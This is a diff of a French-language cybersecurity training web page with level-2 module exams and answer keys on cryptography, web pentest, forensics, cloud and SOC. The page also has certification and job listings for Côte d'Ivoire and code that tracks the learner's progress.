+   EXAMENS NIVEAU 2 (E6-E10)
+   ============================================================ */
+var EXAMS = [
+{id:"E6", module:"Module 6 - Cryptographie", from:101, to:120, niveau:2,
+  titre:"Examen Module 6 : Cryptographie & PKI", duree:30,
+  questions:[
+    {q:"AES est un algorithme :",a:["Asymetrique","Symetrique","Hash","Signature"],c:1,e:"AES = 1 cle partagee."},
+    {q:"Le mode ECB est :",a:["Recommande","A eviter","Moderne","Rapide"],c:1,e:"ECB = motifs repetes."},
+    {q:"MD5 est :",a:["Sur","Casse","Moderne","Quantum"],c:1,e:"MD5 casse depuis 2004."},
+    {q:"Recommande pour hasher MDP :",a:["SHA-256","MD5","argon2","SHA-1"],c:2,e:"Argon2 = standard moderne."},
+    {q:"RSA minimum aujourd'hui :",a:["512","1024","2048","16384"],c:2,e:"2048 min."},
+    {q:"Signature numerique utilise :",a:["Cle publique","Cle privee","Hash","Rien"],c:1,e:"Cle privee pour signer."},
+    {q:"Un certificat X.509 est signe par :",a:["L'utilisateur","Une CA","Le serveur","Rien"],c:1,e:"Autorite de Certification."},
+    {q:"TLS actuel recommande :",a:["1.0","1.1","1.2","1.3"],c:3,e:"TLS 1.3 (2018)."},
+    {q:"Faille JWT classique :",a:["alg:none","Padding","Reboot","Ping"],c:0,e:"Accepter JWT non signe."},
+    {q:"HSM est :",a:["Logiciel","Materiel securise","Reseau","Rien"],c:1,e:"Module crypto materiel."}
+  ]
+},
+{id:"E7", module:"Module 7 - Web Pentest", from:121, to:140, niveau:2,
+  titre:"Examen Module 7 : Web Pentest & OWASP", duree:30,
+  questions:[
+    {q:"Top 1 OWASP 2021 :",a:["SQLi","Broken Access Control","XSS","CSRF"],c:1,e:"Access Control #1."},
+    {q:"Defense SQLi :",a:["WAF","Prepared statements","Blacklist","Rien"],c:1,e:"Requetes preparees."},
+    {q:"XSS vole :",a:["MDP DB","Session cookie","Fichier","Rien"],c:1,e:"Cookie de session."},
+    {q:"CSRF defense principale :",a:["SameSite + token","Blacklist","WAF seul","Rien"],c:0,e:"SameSite + token."},
+    {q:"IDOR = ",a:["Injection SQL","Acces objet direct","XSS","Rien"],c:1,e:"Insecure Direct Object Reference."},
+    {q:"SSRF cible :",a:["Client","Serveur","Rien","Base"],c:1,e:"Requete serveur."},
+    {q:"Burp Suite est :",a:["Proxy web","Antivirus","Rien","Scanner OS"],c:0,e:"Proxy d'interception."},
+    {q:"ffuf sert a :",a:["Fuzzer","Scanner OS","Proxy","Rien"],c:0,e:"Fuzzing rapide."},
+    {q:"Une API expose souvent sa doc via :",a:["Swagger","Rien","Rien","Rien"],c:0,e:"Swagger/OpenAPI."},
+    {q:"CVSS score 9-10 = ",a:["Low","Medium","High","Critical"],c:3,e:"9-10 = Critical."}
+  ]
+},
+{id:"E8", module:"Module 8 - Forensics", from:141, to:160, niveau:2,
+  titre:"Examen Module 8 : Forensics & Incident Response", duree:30,
+  questions:[
+    {q:"Ordre de volatilite :",a:["Disque puis RAM","RAM puis disque","Rien","Hasard"],c:1,e:"RAM d'abord."},
+    {q:"dd sert a :",a:["Image bit-a-bit","Compresser","Hash","Rien"],c:0,e:"Copie brute."},
+    {q:"Volatility analyse :",a:["RAM","Disque","Rien","Reseau"],c:0,e:"Outil d'analyse RAM."},
+    {q:"Event ID logon echoue Windows :",a:["4624","4625","4688","Rien"],c:1,e:"4625 = logon echoue."},
+    {q:"Event ID log efface :",a:["1102","4624","4720","Rien"],c:0,e:"1102 = clear log."},
+    {q:"Log SSH Linux :",a:["auth.log","syslog","Rien","Rien"],c:0,e:"auth.log = SSH."},
+    {q:"Malware analysis statique utilise :",a:["strings","Execution","Rien","Rien"],c:0,e:"Extraction texte."},
+    {q:"Containment :",a:["Isoler sans eteindre","Eteindre","Rien","Formater"],c:0,e:"Ne pas eteindre = RAM preservee."},
+    {q:"Systeme compromis :",a:["Nettoyer","Reinstaller","Rien","Reboot"],c:1,e:"Reinstallation obligatoire."},
+    {q:"Chain of custody :",a:["Tracabilite preuves","Chiffrement","Hash","Rien"],c:0,e:"Documentation des preuves."}
+  ]
+},
+{id:"E9", module:"Module 9 - Cloud & DevSecOps", from:161, to:180, niveau:2,
+  titre:"Examen Module 9 : Cloud & DevSecOps", duree:30,
+  questions:[
+    {q:"IaaS :",a:["VM","App managed","Rien","Rien"],c:0,e:"Infrastructure as a Service."},
+    {q:"99% des breaches cloud :",a:["Mauvaise config client","Provider","Rien","Rien"],c:0,e:"Erreur cote client."},
+    {q:"AWS IAM :",a:["Gestion identites","Antivirus","Rien","Rien"],c:0,e:"Identity & Access Management."},
+    {q:"Bucket S3 public :",a:["Fuite","Normal","Rien","Rien"],c:0,e:"Cause #1 fuite."},
+    {q:"Security Group est :",a:["Stateful","Stateless","Rien","Rien"],c:0,e:"AWS SG = stateful."},
+    {q:"Docker --privileged :",a:["Dangereux","Sur","Rien","Rien"],c:0,e:"Risque escape."},
+    {q:"K8s RBAC :",a:["Roles","Pods","Rien","Rien"],c:0,e:"Role-based access."},
+    {q:"SAST :",a:["Statique","Dynamique","Rien","Rien"],c:0,e:"Analyse code source."},
+    {q:"Secrets management :",a:["Jamais en clair","OK clair","Rien","Rien"],c:0,e:"Jamais dans code."},
+    {q:"Zero Trust :",a:["Verifier tout","Tout confiance","Rien","Rien"],c:0,e:"Never trust, always verify."}
+  ]
+},
+{id:"E10", module:"Module 10 - SOC avance", from:181, to:200, niveau:2,
+  titre:"Examen Module 10 : SOC & Threat Hunting", duree:30,
+  questions:[
+    {q:"SOC L1 fait :",a:["Triage","Hunt","Rien","Rien"],c:0,e:"Premier niveau = triage."},
+    {q:"MTTD :",a:["Mean Time to Detect","Rien","Rien","Rien"],c:0,e:"Temps de detection."},
+    {q:"Sigma est :",a:["Format detection","Antivirus","Rien","Rien"],c:0,e:"Regle universelle."},
+    {q:"MITRE ATT&CK :",a:["Framework TTP","Antivirus","Rien","Rien"],c:0,e:"Framework menaces."},
+    {q:"Threat intel partage via :",a:["MISP","Rien","Rien","Rien"],c:0,e:"Plateforme de partage."},
+    {q:"Ghidra est :",a:["Decompilateur","Antivirus","Rien","Rien"],c:0,e:"Outil NSA."},
+    {q:"Purple team :",a:["Red+blue","Rien","Rien","Rien"],c:0,e:"Collaboration."},
+    {q:"PsExec = ",a:["Lateral","Local","Rien","Rien"],c:0,e:"Deplacement lateral."},
+    {q:"YARA = ",a:["Detection malware","Rien","Rien","Rien"],c:0,e:"Regles detection."},
+    {q:"Honeypot :",a:["Leurre","Antivirus","Rien","Rien"],c:0,e:"Systeme piege."}
+  ]
+}
+];
+
+var EXAM_PASS_RATIO = 0.7;
+
+var CERT_PLAN = [
+{seuil:120, modules:"Defis 101-120", titre:"Cryptographie & PKI", cert:"CompTIA Security+ (SY0-701)", url:"https://www.comptia.org/certifications/security", type:"paid", desc:"Certification generaliste reference. ~400 USD."},
+{seuil:140, modules:"Defis 121-140", titre:"Web Pentest & OWASP", cert:"eJPT (INE Security)", url:"https://security.ine.com/certifications/ejpt-certification/", type:"paid", desc:"Junior Pentester. ~200 USD. Pratique."},
+{seuil:160, modules:"Defis 141-160", titre:"Forensics & IR", cert:"CompTIA CySA+ (CS0-003)", url:"https://www.comptia.org/certifications/cybersecurity-analyst", type:"paid", desc:"Analyste SOC. ~400 USD."},
+{seuil:180, modules:"Defis 161-180", titre:"Cloud & DevSecOps", cert:"AWS Certified Security - Specialty", url:"https://aws.amazon.com/certification/certified-security-specialty/", type:"paid", desc:"Cloud security AWS. ~300 USD."},
+{seuil:200, modules:"Defis 181-200", titre:"Niveau 2 complet", cert:"OSCP (Offensive Security)", url:"https://www.offsec.com/courses/pen-200/", type:"paid", desc:"Reference pentest. ~1600 USD. Tres exigeant."}
+];
+
+var MILESTONES = [
+{seuil:120, titre:"PKI interne + signatures", date:"Apres defi 120", desc:"Root CA + Intermediate + certificats signes."},
+{seuil:140, titre:"Pentest web complet (Juice Shop)", date:"Apres defi 140", desc:"OWASP Top 10 + rapport."},
+{seuil:160, titre:"Simulation incident DFIR", date:"Apres defi 160", desc:"Detection + containment + IR + rapport."},
+{seuil:180, titre:"Architecture cloud securisee", date:"Apres defi 180", desc:"Terraform + Prowler clean + monitoring."},
+{seuil:200, titre:"Mini-SOC complet + demo", date:"Apres defi 200", desc:"Wazuh + Sysmon + Suricata + Shuffle + demo."}
+];
+
+var JOBS = [
+{nom:"Orange Cyberdefense CI", url:"https://www.orangecyberdefense.com/", type:"International", desc:"Pentest, SOC, IR."},
+{nom:"Djamo - Junior SOC Analyst", url:"https://ci.eclozion-opportunities.com/opportunite/junior-soc-analyst/", type:"CI FinTech - Junior", desc:"SOC, logs PCI DSS, incidents."},
+{nom:"SIB - Controleur Risques IT-SSI", url:"https://emploi.educarriere.ci/offre-156356-controleur-risques-it-ssi-junior-1.html", type:"CI Banque - Junior", desc:"ISO 27000, NIST."},
+{nom:"BOA - Analyste Securite SI", url:"https://yop.l-frii.com/opportunite-a-saisir-au-groupe-bank-of-africa-boa-02-octobre-2025/", type:"CI Banque - Junior", desc:"Coordination securite."},
+{nom:"Bridge Bank CI - Stagiaires Securite", url:"https://ci.eclozion-opportunities.com/opportunite/bridge-bank-recrute-2-stagiaires-en-securite-numerique/", type:"CI Banque - Stage", desc:"Politique securite, pentest, PCI-DSS."},
+{nom:"AFG Holding - Stagiaire Cyber", url:"https://yop.l-frii.com/offre-de-stage-a-atlantic-financial-group-holding-afg-holding-29-novembre-2025/", type:"CI Banque - Stage", desc:"DevSecOps, ISO 27001, Kali."},
+{nom:"Societe Generale CI - Stages", url:"https://yop.l-frii.com/des-dizaines-dopportunites-de-stage-chez-societe-generale-28-mai-2026/", type:"CI Banque - Stage", desc:"9 metiers dont cyber."},
+{nom:"LinkedIn Jobs", url:"https://www.linkedin.com/jobs/", type:"International", desc:"SOC Junior Abidjan."}
+];
+
+var state = JSON.parse(localStorage.getItem('cyber_ci_lvl2') || '{"done":{},"exams":{}}');
+if (!state.exams) state.exams = {};
+Object.keys(state.done).forEach(function(id){ if (state.done[id] === true) state.done[id] = new Date().toISOString(); });
+function save(){ localStorage.setItem('cyber_ci_lvl2', JSON.stringify(state)); }
+var app = document.getElementById('app');
+
+function todayKey(){ return new Date().toISOString().split('T')[0]; }
+function countToday(){ var t = todayKey(); return Object.values(state.done).filter(function(v){ return typeof v === 'string' && v.startsWith(t); }).length; }
+function countTotal(){ return Object.keys(state.done).length; }
+function passedExamsCount(){ return Object.keys(state.exams).filter(function(k){ return state.exams[k].passed; }).length; }
+
+function isExamUnlocked(ex){
+  for (var i = ex.from; i <= ex.to; i++){
+    if (!state.done[i]) return false;
+  }
+  return true;
+}
+function isExamPassed(ex){
+  return !!(state.exams && state.exams[ex.id] && state.exams[ex.id].passed);
+}
+
+function updateProg(){
+  var done = countTotal(), today = countToday();
+  document.getElementById('hs').innerHTML = "Aujourdhui : <b>" + today + "</b> · Defis : <b>" + done + "/" + D.length + "</b> · Examens : <b>" + passedExamsCount() + "/" + EXAMS.length + "</b>";
+}
+
+function render(){
+  updateProg();
+  var today = countToday(), total = countTotal();
+  
+  var html = '<div class="hero"><h2>Niveau 2 : Cybersecurite Avancee <span class="level-tag l2">NIVEAU 2</span></h2><p>100 defis avances en cryptographie, pentest web, forensics, cloud et SOC. Objectif : analyste SOC ou pentester junior en banque.</p></div>';
+  
+  html += '<div class="card"><div class="stats-grid"><div class="stat"><span class="big">' + today + '</span><span class="lbl">Aujourdhui</span></div><div class="stat"><span class="big">' + total + '/100</span><span class="lbl">Defis</span></div><div class="stat"><span class="big">' + passedExamsCount() + '/5</span><span class="lbl">Examens</span></div><div class="stat"><span class="big">' + Math.round(total/D.length*100) + '%</span><span class="lbl">Progression</span></div></div>';
+  html += '<div style="display:flex;gap:8px;margin-top:12px;flex-wrap:wrap"><button class="gold" onclick="showCerts()">Certifications</button><button class="gold" onclick="showStats()">Statistiques</button><button class="gold" onclick="showJobs()">Emplois CI</button><button class="sec" onclick="reset()">Reinitialiser</button></div></div>';
+  
+  var mods = [
+    {n:"Module 6 - Cryptographie & PKI", from:101, to:120, cs:120, exam:"E6"},
+    {n:"Module 7 - Web Pentest & OWASP", from:121, to:140, cs:140, exam:"E7"},
+    {n:"Module 8 - Forensics & IR", from:141, to:160, cs:160, exam:"E8"},
+    {n:"Module 9 - Cloud & DevSecOps", from:161, to:180, cs:180, exam:"E9"},
+    {n:"Module 10 - SOC avance & Threat Hunting", from:181, to:200, cs:200, exam:"E10"}
+  ];
+  
+  mods.forEach(function(m){
+    var defis = D.filter(function(d){ return d.id >= m.from && d.id <= m.to; });
+    var done = defis.filter(function(d){ return state.done[d.id]; }).length;
+    var cp = CERT_PLAN.filter(function(c){ return c.seuil === m.cs; })[0];
+    var exam = EXAMS.filter(function(e){ return e.id === m.exam; })[0];
+    var examUnlocked = exam && isExamUnlocked(exam);
+    var examPassed = exam && isExamPassed(exam);
+    var status = done === defis.length ? 'done' : '';
+    
+    html += '<div class="card" style="border-left:4px solid #a855f7"><h2 style="color:#e9d5ff">' + m.n + '</h2><p style="color:#94a3b8;font-size:0.8em">' + done + '/' + defis.length + ' defis valides</p>';
+    if (cp) {
+      var badge = cp.type === 'free' ? 'free' : (cp.type === 'partial' ? 'partial' : 'paid');
+      var badgeTxt = cp.type === 'free' ? 'GRATUIT' : (cp.type === 'partial' ? 'PARTIEL' : 'PAYANT');
+      html += '<div class="cert ' + status + '"><h4>' + (status?'Debloquee':'A debloquer') + ' - ' + cp.modules + '</h4><div style="font-weight:700;margin:4px 0">' + cp.cert + ' <span class="badge ' + badge + '">' + badgeTxt + '</span></div><div style="font-size:0.85em;color:#94a3b8;margin-top:6px">' + cp.desc + '</div><div style="margin-top:6px"><a href="' + cp.url + '" target="_blank">Site officiel</a></div></div>';
+    }
+    html += '<div class="grid">';
+    defis.forEach(function(d){
+      var cls = state.done[d.id] ? 'done' : '';
+      html += '<div class="btn ' + cls + '" onclick="show(' + d.id + ')"><span class="n">Defi ' + d.id + '</span><span class="ti">' + d.t + '</span></div>';
+    });
+    html += '</div>';
+    
+    if (exam) {
+      var cls2 = examPassed ? 'passed' : (examUnlocked ? '' : 'locked');
+      var badgeCls = examPassed ? 'passed' : (examUnlocked ? 'ready' : 'locked');
+      var badgeTxt2 = examPassed ? 'REUSSI' : (examUnlocked ? 'PRET' : 'VERROUILLE');
+      html += '<div class="exam-card ' + cls2 + '"><span class="exam-badge ' + badgeCls + '">' + badgeTxt2 + '</span><h4>' + exam.titre + '</h4>';
+      html += '<div class="qcount">' + exam.questions.length + ' questions · Seuil : ' + Math.round(EXAM_PASS_RATIO*100) + '% · ' + exam.duree + ' min</div>';
+      if (examPassed) {
+        var sc = state.exams[exam.id].score;
+        html += '<div style="color:#86efac;font-size:0.85em;margin-top:6px">Score : ' + sc + '/' + exam.questions.length + ' (' + Math.round(sc/exam.questions.length*100) + '%)</div>';
+        html += '<div class="nav"><button class="exam" onclick="startExam(\'' + exam.id + '\')">Repasser</button></div>';
+      } else if (examUnlocked) {
+        html += '<div style="color:#e9d5ff;font-size:0.85em;margin-top:6px">Module complete ! Passez l\'examen.</div>';
+        html += '<div class="nav"><button class="exam" onclick="startExam(\'' + exam.id + '\')">Passer l\'examen</button></div>';
+      } else {
+        var reste = exam.to - done;
+        html += '<div style="color:#94a3b8;font-size:0.85em;margin-top:6px">Validez les ' + reste + ' defis restants pour debloquer.</div>';
+      }
+      html += '</div>';
+    }
+    
+    html += '</div>';
+  });
+  
+  app.innerHTML = html;
+  window.scrollTo(0,0);
+}
+
+function show(id){
+  var d = D.filter(function(x){ return x.id === id; })[0];
+  if (!d) return;
+  var dateValid = state.done[d.id];
+  var dateStr = dateValid ? new Date(dateValid).toLocaleString('fr-FR') : '';
+  
+  var html = '<div class="card"><div class="meta"><small>Defi ' + d.id + '/200</small><small>' + d.d + ' min</small>' + (dateStr ? '<small style="color:#22c55e">Valide le ' + dateStr + '</small>' : '') + '<small class="level-tag l2">NIVEAU 2</small></div>';
+  html += '<h2>Defi ' + d.id + ' : ' + d.t + '</h2>';
+  html += '<div class="intro"><h3 style="color:#e9d5ff;margin-top:0">Introduction</h3><p>' + d.intro + '</p></div>';
+  html += '<div class="analogy"><b>Analogie :</b> ' + d.analogy + '</div>';
+  
+  d.sections.forEach(function(s, i){
+    html += '<div class="section"><h3>' + (i+1) + '. ' + s.titre + '</h3>' + s.contenu;
+    if (s.svg && SVG[s.svg]) {
+      html += '<div class="svg-box">' + SVG[s.svg] + '</div>';
+    }
+    html += '</div>';
+  });
+  
+  html += '<div class="why"><b>Pourquoi en cyber :</b> ' + d.why + '</div>';
+  html += '<div class="bank"><b>Pourquoi pour une banque :</b> ' + d.bank + '</div>';
+  html += '<div class="glo"><b>Glossaire :</b> ' + d.glo + '</div>';
+  html += '<div class="pr"><h3 style="color:#22c55e;margin-top:0">PRATIQUE</h3><ol>';
+  d.pr.forEach(function(p){ html += '<li>' + p + '</li>'; });
+  html += '</ol></div>';
+  html += '<div class="er"><b>Erreur a eviter :</b> ' + d.er + '</div>';
+  html += '<div class="df"><b>Exercice final :</b> ' + d.df + '</div>';
+  html += '<div class="car"><b>Livrable portfolio :</b> ' + d.proj + '</div>';
+  html += '<h3>Quiz</h3><div class="quiz" id="quiz">';
+  
+  d.q.forEach(function(q, i){
+    html += '<div class="q"><b>Q' + (i+1) + '. ' + q.q + '</b>';
+    q.a.forEach(function(opt, j){
+      html += '<label><input type="radio" name="q' + i + '" value="' + j + '"> ' + opt + '</label>';
+    });
+    html += '<div class="exp" id="exp' + i + '"></div></div>';
+  });
+  
+  html += '</div><div class="nav"><button class="sec" onclick="render()">Accueil</button><button onclick="validate(' + id + ')">Valider</button></div><div id="res"></div></div>';
+  
+  app.innerHTML = html;
+  window.scrollTo(0,0);
+}
+
+function validate(id){
+  var d = D.filter(function(x){ return x.id === id; })[0];
+  var correct = 0;
+  d.q.forEach(function(q, i){
+    var sel = document.querySelector('input[name="q' + i + '"]:checked');
+    var labels = document.querySelectorAll('input[name="q' + i + '"]');
+    labels.forEach(function(inp, j){
+      var lbl = inp.parentElement;
+      if (j === q.c) lbl.classList.add('ok');
+      if (sel && +sel.value === j && j !== q.c) lbl.classList.add('ko');
+    });
+    var exp = document.getElementById('exp' + i);
+    exp.style.display = 'block';
+    exp.innerHTML = q.e;
+    if (sel && +sel.value === q.c) correct++;
+  });
+  
+  var ok = correct === d.q.length;
+  var dejaValide = !!state.done[id];
+  document.getElementById('res').innerHTML = '<div class="res ' + (ok?'g':'r') + '">' + (ok ? 'Defi ' + d.id + ' valide !' : 'Score : ' + correct + '/' + d.q.length + ' - Reessayez') + '</div>';
+  
+  if (ok && !dejaValide) {
+    state.done[id] = new Date().toISOString();
+    save();
+    updateProg();
+    var exam = EXAMS.filter(function(e){ return e.from <= id && e.to >= id; })[0];
+    if (exam && isExamUnlocked(exam) && !isExamPassed(exam)) {
+      document.getElementById('res').innerHTML += '<div class="res g" style="margin-top:8px">Module complete ! <a href="#" onclick="startExam(\'' + exam.id + '\');return false;">Passer l\'examen final</a></div>';
+    }
+  }
+}
+
+var currentExam = null;
+
+function startExam(id){
+  var ex = EXAMS.filter(function(e){ return e.id === id; })[0];
+  if (!ex) return;
+  if (!isExamUnlocked(ex)) { alert("Validez d'abord tous les defis du module."); return; }
+  currentExam = ex;
+  
+  var html = '<div class="card"><div class="meta"><small>Examen ' + ex.id + '</small><small>' + ex.questions.length + ' questions</small><small>Seuil ' + Math.round(EXAM_PASS_RATIO*100) + '%</small><small class="level-tag l2">NIVEAU 2</small></div>';
+  html += '<h2>' + ex.titre + '</h2>';
+  html += '<div class="intro"><p><b>Instructions :</b> Repondez a toutes les questions. Il faut au moins ' + Math.ceil(ex.questions.length * EXAM_PASS_RATIO) + '/' + ex.questions.length + ' bonnes reponses.</p></div>';
+  html += '<div class="quiz" id="examQuiz">';
+  
+  ex.questions.forEach(function(q, i){
+    html += '<div class="q" data-qi="' + i + '"><b>Q' + (i+1) + '. ' + q.q + '</b>';
+    q.a.forEach(function(opt, j){
+      html += '<label><input type="radio" name="exam_q' + i + '" value="' + j + '"> ' + opt + '</label>';
+    });
+    html += '<div class="exp" id="exam_exp' + i + '"></div></div>';
+  });
+  
+  html += '</div><div class="nav"><button class="sec" onclick="render()">Annuler</button><button class="exam" onclick="submitExam()">Valider l\'examen</button></div><div id="exam_res"></div></div>';
+  
+  app.innerHTML = html;
+  window.scrollTo(0,0);
+}
+
+function submitExam(){
+  if (!currentExam) return;
+  var ex = currentExam;
+  var correct = 0;
+  var details = [];
+  
+  ex.questions.forEach(function(q, i){
+    var sel = document.querySelector('input[name="exam_q' + i + '"]:checked');
+    var labels = document.querySelectorAll('input[name="exam_q' + i + '"]');
+    labels.forEach(function(inp, j){
+      var lbl = inp.parentElement;
+      if (j === q.c) lbl.classList.add('ok');
+      if (sel && +sel.value === j && j !== q.c) lbl.classList.add('ko');
+    });
+    var exp = document.getElementById('exam_exp' + i);
+    exp.style.display = 'block';
+    exp.innerHTML = q.e;
+    var ok = sel && +sel.value === q.c;
+    if (ok) correct++;
+    details.push({q: q.q, ok: ok, correct: q.a[q.c], chosen: sel ? q.a[+sel.value] : '(aucune)'});
+  });
+  
+  var ratio = correct / ex.questions.length;
+  var passed = ratio >= EXAM_PASS_RATIO;
+  var existing = state.exams[ex.id];
+  if (!existing || !existing.passed || correct > existing.score) {
+    state.exams[ex.id] = {
+      score: correct,
+      total: ex.questions.length,
+      passed: passed,
+      date: new Date().toISOString()
+    };
+    save();
+  }
+  
+  var msg = '';
+  if (passed) {
+    msg = '<div class="res g">Examen REUSSI ! ' + correct + '/' + ex.questions.length + ' (' + Math.round(ratio*100) + '%)</div>';
+    if (!existing || !existing.passed) {
+      msg += '<div class="res g" style="margin-top:8px">Felicitations, module valide !</div>';
+    }
+  } else {
+    msg = '<div class="res r">Examen echoue : ' + correct + '/' + ex.questions.length + ' (' + Math.round(ratio*100) + '%) - Il faut ' + Math.ceil(ex.questions.length*EXAM_PASS_RATIO) + '/' + ex.questions.length + '</div>';
+  }
+  
+  msg += '<div class="card" style="margin-top:12px"><h3>Detail des reponses</h3><table><tr><th>#</th><th>Question</th><th>Votre reponse</th><th>Bonne reponse</th><th>Statut</th></tr>';
+  details.forEach(function(d, i){
+    msg += '<tr><td>' + (i+1) + '</td><td>' + d.q + '</td><td>' + d.chosen + '</td><td>' + d.correct + '</td><td style="color:' + (d.ok?'#22c55e':'#ef4444') + '">' + (d.ok?'OK':'KO') + '</td></tr>';
+  });
+  msg += '</table></div>';
+  
+  msg += '<div class="nav"><button class="sec" onclick="render()">Accueil</button><button class="exam" onclick="startExam(\'' + ex.id + '\')">Repasser</button></div>';
+  
+  document.getElementById('exam_res').innerHTML = msg;
+  updateProg();
+  window.scrollTo(0, document.body.scrollHeight - 400);
+}
+
+function showCerts(){
+  var total = countTotal();
+  var html = '<div class="card"><button class="sec" onclick="render()">Accueil</button><h2>Certifications Niveau 2</h2>';
+  CERT_PLAN.forEach(function(p){
+    var status = total >= p.seuil ? 'done' : '';
+    var badge = p.type === 'free' ? 'free' : (p.type === 'partial' ? 'partial' : 'paid');
+    var badgeTxt = p.type === 'free' ? 'GRATUIT' : (p.type === 'partial' ? 'PARTIEL' : 'PAYANT');
+    var exam = EXAMS.filter(function(e){ return e.to === p.seuil; })[0];
+    var examPassed = exam && isExamPassed(exam);
+    html += '<div class="cert ' + status + '"><h4>' + p.titre + ' - ' + p.modules + '</h4><div style="font-size:0.85em;color:#fbbf24;font-weight:700;margin:4px 0">' + p.seuil + ' defis minimum</div><div style="font-weight:700;margin:4px 0">' + p.cert + ' <span class="badge ' + badge + '">' + badgeTxt + '</span></div><div style="font-size:0.85em;color:#94a3b8;margin-top:6px">' + p.desc + '</div><div style="margin-top:8px"><a href="' + p.url + '" target="_blank">Site officiel</a></div>' + (status==='done'?'<div style="color:#86efac;font-weight:700;margin-top:8px">Debloquee' + (examPassed ? ' ✓ Examen reussi' : ' (examen a passer)') + '</div>':'<div style="color:#94a3b8;margin-top:8px">Encore ' + (p.seuil-total) + ' defis</div>') + '</div>';
+  });
+  html += '</div>';
+  app.innerHTML = html;
+}
+
+function showStats(){
+  var total = countTotal(), today = countToday();
+  var now = new Date();
+  var dayOfWeek = now.getDay() || 7;
+  var monday = new Date(now); monday.setDate(now.getDate() - dayOfWeek + 1); monday.setHours(0,0,0,0);
+  var week = Object.values(state.done).filter(function(v){ return typeof v === 'string' && new Date(v) >= monday; }).length;
+  var monthStart = new Date(now.getFullYear(), now.getMonth(), 1);
+  var month = Object.values(state.done).filter(function(v){ return typeof v === 'string' && new Date(v) >= monthStart; }).length;
+  var milestonesDone = MILESTONES.filter(function(m){ return state.done[m.seuil]; });
+  
+  var html = '<div class="card"><button class="sec" onclick="render()">Accueil</button><h2>Statistiques</h2>';
+  html += '<div class="stats-grid"><div class="stat"><span class="big">' + today + '</span><span class="lbl">Aujourdhui</span></div><div class="stat"><span class="big">' + week + '</span><span class="lbl">Semaine</span></div><div class="stat"><span class="big">' + month + '</span><span class="lbl">Mois</span></div><div class="stat"><span class="big">' + total + '/100</span><span class="lbl">Total</span></div></div>';
+  
+  html += '<h3>Examens de module</h3>';
+  html += '<table><tr><th>Examen</th><th>Score</th><th>Statut</th><th>Date</th></tr>';
+  EXAMS.forEach(function(ex){
+    var r = state.exams && state.exams[ex.id];
+    var statut = r ? (r.passed ? 'REUSSI' : 'ECHOUE') : 'Non passe';
+    var color = r ? (r.passed ? '#22c55e' : '#ef4444') : '#94a3b8';
+    html += '<tr><td>' + ex.titre + '</td><td>' + (r ? r.score + '/' + r.total : '-') + '</td><td style="color:' + color + ';font-weight:700">' + statut + '</td><td>' + (r ? new Date(r.date).toLocaleString('fr-FR') : '-') + '</td></tr>';
+  });
+  html += '</table>';
+  
+  html += '<h3>Projets majeurs atteints</h3>';
+  if (milestonesDone.length === 0) {
+    html += '<p style="color:#94a3b8">Aucun projet majeur encore atteint.</p>';
+  } else {
+    html += '<ul>';
+    milestonesDone.forEach(function(m){ html += '<li><b>' + m.titre + '</b> - ' + m.date + '<br><span style="color:#94a3b8;font-size:0.85em">' + m.desc + '</span></li>'; });
+    html += '</ul>';
+  }
+  html += '<h3>Historique defis (20 dernieres)</h3><table><tr><th>Defi</th><th>Titre</th><th>Date</th></tr>';
+  var entries = Object.entries(state.done).sort(function(a,b){ return new Date(b[1]) - new Date(a[1]); });
+  entries.slice(0, 20).forEach(function(e){
+    var d = D.filter(function(x){ return x.id === +e[0]; })[0];
+    html += '<tr><td>' + e[0] + '</td><td>' + (d?d.t:'?') + '</td><td>' + new Date(e[1]).toLocaleString('fr-FR') + '</td></tr>';
+  });
+  html += '</table></div>';
+  app.innerHTML = html;
+}
+
+function showJobs(){
+  var html = '<div class="card"><button class="sec" onclick="render()">Accueil</button><h2>Emplois en Cote dIvoire</h2>';
+  JOBS.forEach(function(j){
+    html += '<div class="job"><h4>' + j.nom + '</h4><div style="font-size:0.75em;color:#94a3b8">' + j.type + '</div><div style="margin:6px 0;font-size:0.88em">' + j.desc + '</div><a href="' + j.url + '" target="_blank">' + j.url + '</a></div>';
+  });
+  html += '</div>';
+  app.innerHTML = html;
+}
+
+function reset(){
+  if (confirm('Reinitialiser toute la progression du Niveau 2 ?')) {
+    localStorage.removeItem('cyber_ci_lvl2');
+    location.reload();
+  }
+}
+
+render();
+</script>
+</body>
+</html>
